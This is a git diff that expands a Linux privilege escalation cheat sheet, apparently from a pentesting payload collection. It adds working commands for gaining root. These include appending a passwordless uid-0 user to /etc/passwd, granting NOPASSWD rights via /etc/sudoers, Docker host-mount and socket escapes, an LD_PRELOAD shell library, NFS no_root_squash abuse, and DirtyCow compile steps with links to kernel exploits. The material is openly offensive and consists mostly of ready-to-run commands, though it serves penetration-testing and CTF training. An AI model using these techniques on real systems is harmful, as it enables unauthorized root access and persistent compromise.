@@ -1,20 +1,12 @@
 # Linux - Privilege Escalation
 
-## Tools
-
-- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
-    ```powershell
-    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
-    ```
-- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
-- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123)
-- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
-
 ## Summary
 
-* [Checklist](#checklist)
+* [Tools](#tools)
+* [Checklist](#checklists)
 * [Looting for passwords](#looting-for-passwords)
     * [Files containing passwords](#files-containing-passwords)
+    * [Old passwords in /etc/security/opasswd](#old-passwords-in--etc-security-opasswd)
     * [Last edited files](#last-edited-files)
     * [In memory passwords](#in-memory-passwords)
     * [Find sensitive files](#find-sensitive-files)
@@ -30,12 +22,14 @@
     * [Interesting capabilities](#interesting-capabilities)
 * [SUDO](#sudo)
     * [NOPASSWD](#nopasswd)
-    * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
+    * [LD_PRELOAD and NOPASSWD](#ld_preload-and-nopasswd)
     * [Doas](#doas)
     * [sudo_inject](#sudo-inject)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
-* [Writable /etc/passwd](#writable---etc---passwd)
+* [Writable files](#writable-files)
+    * [Writable /etc/passwd](#writable-etcpasswd)
+    * [Writable /etc/sudoers](#writable-etcsudoers)
 * [NFS Root Squashing](#nfs-root-squashing)
 * [Shared Library](#shared-library)
     * [ldconfig](#ldconfig)
@@ -43,6 +37,35 @@
 * [Groups](#groups)
     * [Docker](#docker)
     * [LXC/LXD](#lxclxd)
+* [Kernel Exploits](#kernel-exploits)
+    * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)
+    * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
+    * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)
+    * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)
+
+
+## Tools
+
+- [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)
+
+    ```powershell
+    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+    curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+    ./lse.sh -l1 # shows interesting information that should help you to privesc
+    ./lse.sh -l2 # dump all the information it gathers about the system
+    ```
+
+- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
+    
+    ```powershell
+    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
+    ```
+
+- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
+- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
+- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
+- [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
+
 
 ## Checklists
 
@@ -64,7 +87,7 @@
   * Checks if password hashes are stored in /etc/passwd
   * Extract full details for 'default' uid's such as 0, 1000, 1001 etc
   * Attempt to read restricted files i.e. /etc/shadow
-  * List current users history files (i.e .bash_history, .nano_history etc.)
+  * List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
   * Basic SSH checks
 * Privileged access:
   * Which users have recently used sudo
@@ -126,6 +149,13 @@ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 ```
 
+### Old passwords in /etc/security/opasswd
+
+The `/etc/security/opasswd` file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.
+
+:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes 
+
+
 ### Last edited files
 
 Files that were edited in the last 10 minutes
@@ -172,12 +202,28 @@ Check inside the file, to find other paths with write permissions.
 /etc/cron.weekly
 /etc/sudoers
 /etc/exports
-/etc/at.allow
-/etc/at.deny
 /etc/anacrontab
 /var/spool/cron
 /var/spool/cron/crontabs/root
+
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
 ```
+
+You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
+
+```powershell
+# print both commands and file system events and scan procfs every 1000 ms (=1sec)
+./pspy64 -pf -i 1000 
+```
+
 
 ## Systemd timers
 
@@ -205,6 +251,7 @@ SUID/Setuid stands for "set user ID upon execution", it is enabled by default in
 
 ```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
 ```
 
 ### Create a SUID binary
@@ -265,7 +312,26 @@ sh-5.0# id
 uid=0(root) gid=1000(swissky)
 ```
 
+| Capabilities name  | Description |
+|---|---|
+| CAP_AUDIT_CONTROL  | Allow to enable/disable kernel auditing |
+| CAP_AUDIT_WRITE  | Helps to write records to kernel auditing log |
+| CAP_BLOCK_SUSPEND  | This feature can block system suspends   |
+| CAP_CHOWN  | Allow user to make arbitrary change to files UIDs and GIDs |
+| CAP_DAC_OVERRIDE  | This helps to bypass file read, write and execute permission checks |
+| CAP_DAC_READ_SEARCH  | This only bypass file and directory read/execute permission checks  |
+| CAP_FOWNER  | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file  |
+| CAP_KILL  | Allow the sending of signals to processes belonging to others  |
+| CAP_SETGID  | Allow changing of the GID  |
+| CAP_SETUID  | Allow changing of the UID  |
+| CAP_SETPCAP  | Helps to transferring and removal of current set to any PID |
+| CAP_IPC_LOCK  | This helps to lock memory  |
+| CAP_MAC_ADMIN  | Allow MAC configuration or state changes  |
+| CAP_NET_RAW  | Use RAW and PACKET sockets |
+| CAP_NET_BIND_SERVICE  | SERVICE Bind a socket to internet domain privileged ports  |
+
 ## SUDO
+Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)
 
 ### NOPASSWD
 
@@ -293,7 +359,7 @@ If `LD_PRELOAD` is explicitly defined in the sudoers file
 Defaults        env_keep += LD_PRELOAD
 ```
 
-Compile the following C code with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 
 ```powershell
 #include <stdio.h>
@@ -307,7 +373,7 @@ void _init() {
 }
 ```
 
-Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=/tmp/shell.so find`
+Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
 
 ### Doas
 
@@ -363,10 +429,19 @@ tar cf archive.tar *
 
 Tool: [wildpwn](https://github.com/localh0t/wildpwn)
 
+## Writable files
 
-## Writable /etc/passwd
+List world writable files on the system.
 
-First generate a password with one of the following commands
+```powershell
+find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -perm -2 -type f 2>/dev/null
+find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
+```
+
+### Writable /etc/passwd
+
+First generate a password with one of the following commands.
 
 ```powershell
 openssl passwd -1 -salt hacker hacker
@@ -384,17 +459,39 @@ E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
 You can now use the `su` command with `hacker:hacker`
 
+Alternatively you can use the following lines to add a dummy user without a password.    
+WARNING: you might degrade the current security of the machine.
+
+```powershell
+echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+su - dummy
+```
+
+NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 
+
+### Writable /etc/sudoers
+
+```powershell
+echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
+
+# use SUDO without password
+echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+```
 
 ## NFS Root Squashing
 
-When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it
+When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.
 
 ```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
 # create dir
 mkdir /tmp/nfsdir  
 
 # mount directory 
-mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
 cd /tmp/nfsdir
 
 # copy wanted shell 
@@ -475,6 +572,12 @@ $> docker run -it --rm -v $PWD:/mnt bash
 $> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
 ```
 
+Almost similar but you will also see all processes running on the host and be connected to the same NICs.
+
+```powershell
+docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
+```
+
 Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell
 
 ```powershell
@@ -493,6 +596,13 @@ Press Ctrl-D to exit the docker instance / shell
 
 sh-5.0# id
 uid=0(root) gid=0(root) groups=0(root)
+```
+
+More docker privilege escalation using the Docker Socket.
+
+```powershell
+sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
 
 ### LXC/LXD
@@ -526,6 +636,53 @@ lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
 
+Alternatively https://github.com/initstring/lxd_root
+
+## Kernel Exploits
+
+Precompiled exploits can be found inside these repositories, run them at your own risk !
+* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
+* [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)
+
+The following exploits are known to work well, search for another exploits using `searchsploit -w linux kernel centos`.
+
+### CVE-2016-5195 (DirtyCow)
+
+Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+
+```powershell
+# make dirtycow stable
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
+```
+
+### CVE-2010-3904 (RDS)
+
+Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
+
+```powershell
+https://www.exploit-db.com/exploits/15285/
+```
+
+### CVE-2010-4258 (Full Nelson)
+
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)
+
+```powershell
+https://www.exploit-db.com/exploits/15704/
+```
+
+### CVE-2012-0056 (Mempodipper)
+
+Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
+
+```powershell
+https://www.exploit-db.com/exploits/18411
+```
+
+
 ## References
 
 - [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
@@ -538,3 +695,5 @@ lxc exec mycontainer /bin/sh
 - [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
 - [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
 - [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
+* [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
+* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
